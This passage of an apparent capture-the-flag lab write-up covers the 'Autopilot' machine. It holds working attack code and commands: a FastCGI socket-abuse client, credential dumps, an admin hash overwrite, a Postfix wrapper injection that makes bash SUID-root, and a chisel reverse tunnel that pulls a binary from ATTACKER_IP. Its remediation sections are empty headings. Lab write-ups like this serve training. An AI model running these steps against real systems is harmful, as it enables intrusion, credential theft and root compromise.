##### Theory: PHP-FPM, FastCGI, and why a 0666 socket is a privilege-escalation primitive

PHP-FPM (FastCGI Process Manager) runs pools of PHP worker processes. A web server does not execute PHP itself; it forwards the request over the FastCGI protocol to a pool via that pool's listening socket, and the pool runs the script and returns the output. Each pool here runs as a dedicated service user.

The socket is the trust boundary. Anyone who can write to a pool's socket can submit a FastCGI request and have the pool execute a PHP file of their choosing, as that pool's user, because PHP-FPM does not chroot by default and will run whatever existing `.php` file the request names in `SCRIPT_FILENAME`. A `0666` (world-writable) socket therefore means any local user can run PHP as the pool's user. Here `grofiles` writes to the `gromox` pool's socket and runs code as `gromox`, reading files `grofiles` cannot.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.2.2 Execute PHP as gromox via FastCGI

```bash
# reader script in a world-readable path (gromox must be able to read it)
cat > /tmp/read.php <<'PHP'
<?php
foreach (['/etc/gromox/mysql_adaptor.cfg','/etc/gromox/ldap_adaptor.cfg'] as $f) {
    echo "=== $f ===\n", @file_get_contents($f), "\n";
}
PHP
chmod 644 /tmp/read.php

# minimal FastCGI client (no external dependencies)
cat > /tmp/fcgi.py <<'PY'
import socket, struct, sys

def enc_len(n):
    return struct.pack('!B', n) if n < 128 else struct.pack('!I', n | 0x80000000)

def record(t, rid, content=b''):
    return struct.pack('!BBHHBx', 1, t, rid, len(content), 0) + content

sock_path = '/run/php-fpm/php-gromox-fpm.sock'
script = '/tmp/read.php'
params = {
    'GATEWAY_INTERFACE':'FastCGI/1.0','REQUEST_METHOD':'GET',
    'SCRIPT_FILENAME':script,'SCRIPT_NAME':script,'QUERY_STRING':'',
    'REQUEST_URI':script,'DOCUMENT_ROOT':'/tmp','SERVER_PROTOCOL':'HTTP/1.1',
    'SERVER_SOFTWARE':'x','REMOTE_ADDR':'127.0.0.1','REMOTE_PORT':'9999',
    'SERVER_ADDR':'127.0.0.1','SERVER_PORT':'80','SERVER_NAME':'x',
    'CONTENT_TYPE':'','CONTENT_LENGTH':'0',
}
rid = 1
pkt  = record(1, rid, struct.pack('!HB5x', 1, 0))   # BEGIN_REQUEST, role=RESPONDER
pd = b''.join(enc_len(len(k)) + enc_len(len(v)) + k.encode() + v.encode()
              for k, v in params.items())
pkt += record(4, rid, pd) + record(4, rid, b'')     # PARAMS + end
pkt += record(5, rid, b'')                           # STDIN end

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock_path)
s.sendall(pkt)
out = b''
while True:
    hdr = s.recv(8)
    if len(hdr) < 8: break
    _, t, _, clen, plen = struct.unpack('!BBHHBx', hdr)
    data = b''
    while len(data) < clen:
        c = s.recv(clen - len(data))
        if not c: break
        data += c
    if plen: s.recv(plen)
    if t == 6: out += data        # STDOUT
    elif t == 3: break            # END_REQUEST
s.close()
sys.stdout.write(out.decode('latin1'))
PY

python3 /tmp/fcgi.py
```

**Result (trimmed):**

```text
X-Powered-By: PHP/8.2.30
Content-type: text/html; charset=UTF-8

=== /etc/gromox/mysql_adaptor.cfg ===
mysql_username=grommunio
mysql_password=gDq6z9YVe4nyNRe5
mysql_dbname=grommunio
schema_upgrade=host:grommunio.autopilot.htb

=== /etc/gromox/ldap_adaptor.cfg ===
ldap_host=ldaps://dc01.autopilot.htb
ldap_bind_user=CN=svc_ldap,OU=Service_Accounts,OU=Resources,DC=autopilot,DC=htb
ldap_bind_pass=Brother6-Let-Ship-Been-Take
ldap_search_base=DC=autopilot,DC=htb
...
```

**What this gives you:**

- MySQL credentials #2 for the `grommunio` database (the Admin API's backing store): `grommunio` / `gDq6z9YVe4nyNRe5`.
- The Active Directory bind account: `svc_ldap` / `Brother6-Let-Ship-Been-Take`, with the domain `autopilot.htb` and the domain controller `dc01.autopilot.htb` (store these for the AD pivot).
- Confirmation that the Admin API database (`grommunio`) is distinct from the Nextcloud database (`grofiles`), which is what makes the Stage 3 password reset target the correct table.
<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.3 Stage 3: Reset the Admin API admin password (in the correct database)

The grommunio Admin API listens on `[::1]:8080` (localhost only, plaintext HTTP) and authenticates against the `grommunio` MySQL database, table `users`, using SHA-512 crypt (`$6$`) hashes. With MySQL creds #2 in hand, overwrite the local `admin` account's hash with a known value, then log in.
<div align="center">
<br>
<br>
</div>

#### 5.3.1 Inspect the users table

```bash
mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio -e 'SHOW TABLES;'
mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio -e 'DESCRIBE users; SELECT id,username,password FROM users;'
```

`admin` is `id = 0` and the only account with a stored password; every `*.autopilot.htb` user has a blank password because they authenticate via LDAP. So `admin` is the single local account, and the one to overwrite.

```text
id | username | password
 0 | admin    | $6$sVnwqyTFDg9nS/Ry$F5bO6xMvzzdfEiGRHmLWyLznzu0GPzG2VUg6fVOV8oRtrSUGmoOkdGqc5QQycK6FywyivdnxGn/Q8udv2TTIb1
 1 | christopher.roberts@autopilot.htb |   (blank, LDAP)
 ... (all other users blank)
```

Record the original hash before changing it, so the account can be restored:

```text
$6$sVnwqyTFDg9nS/Ry$F5bO6xMvzzdfEiGRHmLWyLznzu0GPzG2VUg6fVOV8oRtrSUGmoOkdGqc5QQycK6FywyivdnxGn/Q8udv2TTIb1
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.3.2 Overwrite the hash and authenticate

```bash
# generate a SHA-512 crypt hash for a known password (openssl is portable; python's crypt module is removed in newer Python)
HASH=$(openssl passwd -6 'admin123')
echo "$HASH"

mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio \
  -e "UPDATE users SET password='$HASH' WHERE username='admin';"
mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio \
  -e "SELECT username,password FROM users WHERE username='admin';"

# authenticate to the Admin API (localhost only), capture JWT + CSRF
LOGINRESP=$(curl -sk -X POST 'http://[::1]:8080/api/v1/login' -d 'user=admin&pass=admin123')
echo "$LOGINRESP"
JWT=$(echo "$LOGINRESP"  | python3 -c "import sys,json;print(json.load(sys.stdin)['grommunioAuthJwt'])")
CSRF=$(echo "$LOGINRESP" | python3 -c "import sys,json;print(json.load(sys.stdin)['csrf'])")
echo "JWT length: ${#JWT} | CSRF: $CSRF"
```

**Result:**

```text
{"csrf":"YZYVtg1SVZHRUZP2yETV/9zBjw8PQ1gabw3DrATIaXU=","grommunioAuthJwt":"eyJ...<764 chars>..."}
JWT length: 764 | CSRF: YZYVtg1SVZHRUZP2yETV/9zBjw8PQ1gabw3DrATIaXU=
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.3.3 Rabbit hole reminder: the right database matters

Resetting a hash is only useful in the database the Admin API actually reads. The Admin API authenticates against `grommunio.users` (this step). The Nextcloud/`grofiles` database and its `oc_users` table are a different store entirely: changing the hash there, or running `occ user:resetpassword admin`, returns `{"error":"Invalid username or password"}` at the Admin API and wastes time. Same-looking hash tables, different databases.

**What this gives you:**

- An authenticated grommunio Admin API session as `admin` (`JWT` + `CSRF`), i.e. full control of the management plane.
- The Admin API's documented capabilities (centralised config management via `dbconf`, and service start/stop/restart) are now available, which is exactly what Stage 4 turns into root.

<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.4 Stage 4: Weaponise the Postfix multi-instance wrapper for root

The Admin API can write service config (`dbconf`) and restart services. Postfix turns that combination into root.

##### Theory: Postfix multi-instance wrapper

Postfix supports running several mail instances on one host. When `multi_instance_enable = yes` and `multi_instance_directories` is non-empty, the `postfix(1)` control program no longer manages the mail system directly; for instance-aware actions (start, stop, reload, restart) it executes the command named in `multi_instance_wrapper` (normally `postmulti`), and it does so with root privileges during service start/restart. So if an attacker can (a) write `multi_instance_wrapper` into `main.cf` and (b) trigger a postfix start/restart, root executes an attacker-chosen command. The payload here is `chmod 4755 /bin/bash`, which leaves a SUID-root bash.

The two capabilities exist: `main.cf` is writable via the Admin API `dbconf`, and services are restartable via the Admin API dashboard. The work is in making `dbconf` actually render to `/etc/postfix/main.cf`.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.4.1 Dead end: dbconf PUT stores but does not render

The first attempt set the four keys with a plain REST `PUT` and then restarted postfix:

```bash
curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
  -X PUT 'http://[::1]:8080/api/v1/system/dbconf/postfix/main.cf/' \
  -H 'Content-Type: application/json' \
  -d '{"data":{"multi_instance_enable":"yes","multi_instance_directories":"/etc/postfix","daemon_directory":"/usr/lib/postfix/bin","multi_instance_wrapper":"/usr/bin/chmod 4755 /bin/bash"}}'
# then POST .../dashboard/services/postfix.service/restart  -> {"message":"Success"}

grep -iE 'multi_instance' /etc/postfix/main.cf     # <-- empty: keys never reached the file
ls -l /usr/bin/bash                                 # <-- still -rwxr-xr-x, no SUID
```

The restart reported success but `/etc/postfix/main.cf` had none of the keys, and bash was untouched. Root cause, established by enumeration:

- The Admin API runs as the **non-root** `grommunio` user (`uwsgi`), so it cannot write the root-owned `/etc/postfix/main.cf` itself.
- `dbconf` `PUT` only *stores* the values (confirmed in the `configs` table); applying them to the real file is a separate *commit* step that this call did not carry out.

Trying the same via the `grommunio-admin dbconf` CLI passthrough (`/api/v1/system/cli`) returned `code:0` but also rendered nothing, so the gap was the commit, not the transport.

#### 5.4.2 Understanding the commit mechanism

The `dbconf` commit model is defined in `/usr/share/grommunio-admin-api/tools/dbconf.py`. Two facts decide the exploit:

- The allowed file-commit command (from `GET /api/v1/system/dbconf/commands`) is `sudo postconf -e $FILE_S && systemctl reload postfix`. The `grommunio` user has a passwordless sudo right for `postconf`, so this command writes `main.cf` **as root**.
- `commit()` only runs a command if there are rows under the meta-service `grommunio-dbconf` with `file = <service>` and keys `commit_*`. None existed for postfix, so every earlier commit was a silent no-op (the function returns early).
- In `subVars`, each entry is passed through `shlex.quote`, so `multi_instance_wrapper=/usr/bin/chmod 4755 /bin/bash` is preserved as a single argument and the spaces do not break `postconf`.

So the fix is to define a `commit_file` for postfix, then re-upload `main.cf` to trigger it.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.4.3 The working chain to root

```bash
# 1) define the file-commit for the postfix service (under the grommunio-dbconf meta service)
curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
  -X PUT 'http://[::1]:8080/api/v1/system/dbconf/grommunio-dbconf/postfix/' \
  -H 'Content-Type: application/json' -d '{"data":{"commit_file":"#POSTCONF"}}'

# 2) re-PUT main.cf -> commit() now runs _commitFile -> "sudo postconf -e <entries>" as ROOT
curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
  -X PUT 'http://[::1]:8080/api/v1/system/dbconf/postfix/main.cf/' \
  -H 'Content-Type: application/json' \
  -d '{"data":{"multi_instance_enable":"yes","multi_instance_directories":"/etc/postfix","daemon_directory":"/usr/lib/postfix/bin","multi_instance_wrapper":"/usr/bin/chmod 4755 /bin/bash"}}'

# 3) confirm root wrote the keys into the real file
grep -iE 'multi_instance' /etc/postfix/main.cf

# 4) fire the wrapper via the privileged restart endpoint
curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
  -X POST 'http://[::1]:8080/api/v1/system/dashboard/services/postfix.service/restart' \
  -H 'Content-Type: application/json' -d '{}'

# 5) SUID bash -> root
ls -l /usr/bin/bash
/usr/bin/bash -p -c 'id; cat /root/user.txt'
```

**Result:**

```text
# step 2 response
{"message":"Configuration updated but commit failed (Command exited with status code 256)"}

# step 3: the keys are now in the real file (written by root via sudo postconf)
multi_instance_wrapper = /usr/bin/chmod 4755 /bin/bash
multi_instance_enable = yes
multi_instance_directories = /etc/postfix

# step 5
-rwsr-xr-x 1 root root 1012656 Oct 13  2025 /usr/bin/bash
uid=462(grofiles) gid=462(grofiles) euid=0(root) groups=462(grofiles)
```

The `commit failed (status 256)` is expected and harmless: the commit is `sudo postconf -e $FILE_S && systemctl reload postfix`. The `sudo postconf` ran as root and wrote `main.cf`; only the trailing `systemctl reload postfix` failed because it runs as the non-root `grommunio` user. The privileged dashboard restart (step 4) then started postfix in multi-instance mode, which executed `multi_instance_wrapper` (`chmod 4755 /bin/bash`) as root, setting the SUID bit.

**What this gives you:**

- SUID-root `/bin/bash`; `/usr/bin/bash -p` yields `euid=0(root)`, i.e. full root on the Linux host.
- For a stable root shell: `/usr/bin/bash -p` and work from there.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.4.4 Rabbit holes recorded

- Style B `dbconf` PUT alone (no commit definition) stores but never renders; the restart then runs stock postfix and the wrapper never fires. This is the "postfix restarted but wrapper never ran" trap.
- Omitting `multi_instance_enable=yes`, a non-empty `multi_instance_directories`, or a valid `daemon_directory` leaves the multi-instance code path un-entered, so the wrapper is never invoked even when `main.cf` is written.
- Calling the restart from a browser produces endless 404s; the API is localhost-only and needs the JWT + CSRF from a shell on the box.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.5 User flag

With root on the Linux host, read the user flag:

```bash
/usr/bin/bash -p -c 'cat /root/user.txt'
```

**USER FLAG:** `ec96a1cbc119bfd8161c1c27b8ccfa9f`

> Flag geography: on Autopilot, `user.txt` lives in `/root/` on the Linux grommunio host (HTB syncs flag files from DC01 to the Linux box). If a freshly read flag is ever rejected, it can be a release-day respawn artefact; re-read the file after the box repopulates.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.6 Pivot into the internal AD network

Root on the mail server is the key ring for the Windows domain behind it. The box is dual-homed and sits on the internal AD subnet, so it becomes the gateway for reaching the domain controller.
<div align="center">
<br>
<br>
</div>

#### 5.6.1 See the second network

```bash
ip a; ip route
```

```text
2: eth0 ... inet 172.16.20.10/24 ...
default via 172.16.20.1 dev eth0
172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.10
```

The grommunio host is `172.16.20.10`; the default gateway `172.16.20.1` is the domain controller `DC01`. This subnet is not routable from the attacker directly, so a tunnel is required. (A second workstation, `WS02`, also lives on this subnet and matters later.)
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.6.2 Build a reverse SOCKS tunnel with chisel

```bash
# Attacker (Kali): fetch chisel, run the reverse server, serve the binary for transfer
wget -q https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz -O - | gunzip > chisel && chmod +x chisel
./chisel server -p 9000 --reverse &
python3 -m http.server 8000      # reuse if one is already running

# Target (grommunio root shell): pull the same binary and connect back as a reverse SOCKS client
curl http://ATTACKER_IP:8000/chisel -o /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client ATTACKER_IP:9000 R:socks &
```

The client reports `Connected`, and the server shows `session#1: ... R:127.0.0.1:1080 => socks: Listening`. A SOCKS5 proxy is now live on the attacker at `127.0.0.1:1080`, routing into `172.16.20.0/24`.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.6.3 Point proxychains at the tunnel (and a config gotcha)

```bash
# ensure the ONLY active proxy in [ProxyList] is the chisel SOCKS port
sudo sed -i -E 's/^(socks[45]\s+127\.0\.0\.1\s+9050)/#\1/' /etc/proxychains4.conf   # comment the default Tor line
echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
tail -n 3 /etc/proxychains4.conf
```

Gotcha: proxychains ships in `strict_chain` mode with a default `socks4 127.0.0.1 9050` (Tor) entry. If that line is left active, every request is chained through the dead 9050 proxy first and times out (`127.0.0.1:9050 ... timeout`). Comment it so only the chisel `socks5 127.0.0.1 1080` entry remains.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 5.6.4 Sanity check through the tunnel

```bash
proxychains netexec smb 172.16.20.1
```

```text
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
SMB  172.16.20.1  445  DC01  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:autopilot.htb) (signing:True) (SMBv1:None)
```

**What this gives you:**

- A working SOCKS tunnel from the attacker into the internal AD network via the rooted mail server.
- Confirmation of the domain controller: `DC01` / `autopilot.htb`, Windows Server 2025 (build 26100), SMB signing enforced. All AD tooling now runs through `proxychains`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.7 AD enumeration with svc_ldap (why the standard roasts are dead ends here)

The gromox LDAP config leaked a real domain credential, `svc_ldap`. Use it to enumerate the domain through the tunnel and find a path to a privileged account. All commands run on the attacker via `proxychains`.

#### 5.7.1 Validate and enumerate users

```bash
proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take'
proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' --users
```

52 users are returned. The ones that matter confirm the onboarding email's hierarchy:

| Account | Description | Note |
| ------- | ----------- | ---- |
| `sa-joshua.harris` | Sys Admin | Provisioned 2026-07-13, the promotion account |
| `da-stephanie.lewis` | Domain Admin | The provisioner, final target |
| `svc_smime` | (service) | S/MIME service account, matters for the mail route |
| `svc_ldap` | (service) | The bind account already in hand |

#### 5.7.2 Dead ends: Kerberoast, AS-REP, and svc_ldap ACLs

```bash
# Kerberoast: no user account has an SPN
proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' --kerberoasting kerb.txt
#   -> [*] Total of records returned 0
proxychains -q impacket-GetUserSPNs -dc-ip 172.16.20.1 autopilot.htb/svc_ldap:'Brother6-Let-Ship-Been-Take' -request
#   -> No entries found!

# AS-REP roast: no pre-auth-disabled accounts
proxychains -q netexec ldap 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' --asreproast asrep.txt
#   -> No entries found!

# What can svc_ldap write to?
proxychains -q bloodyAD --host 172.16.20.1 -d autopilot.htb -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' get writable
```

`bloodyAD get writable` returns only:

```text
CN=S-1-5-11,CN=ForeignSecurityPrincipals,...   WRITE   (Authenticated Users, trivial)
CN=svc_ldap,OU=Service_Accounts,...            WRITE   (its own object)
DC=20.16.172.in-addr.arpa,CN=MicrosoftDNS,...  CREATE_CHILD   (ADIDNS record creation)
DC=autopilot.htb,CN=MicrosoftDNS,...           CREATE_CHILD
DC=_msdcs.autopilot.htb,CN=MicrosoftDNS,...    CREATE_CHILD
```

So `svc_ldap` controls nothing that leads to `sa-joshua.harris`: it can write only its own object and the trivial `Authenticated Users` entry, plus create DNS records. This spawn has no SPN to roast and no AS-REP accounts, so the Kerberoast path some community writeups describe does not apply.

**What this gives you:**

- The two target identities confirmed: `sa-joshua.harris` (Sys Admin, the promotion account) and `da-stephanie.lewis` (Domain Admin, the goal).
- Proof that `svc_ldap` cannot reach `sa-joshua.harris` through AD. The credential for `sa-joshua.harris` must be recovered from the mail server (owned as root): the S/MIME-protected provisioning email in his mailbox. Mail is the AD attack surface on this box.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

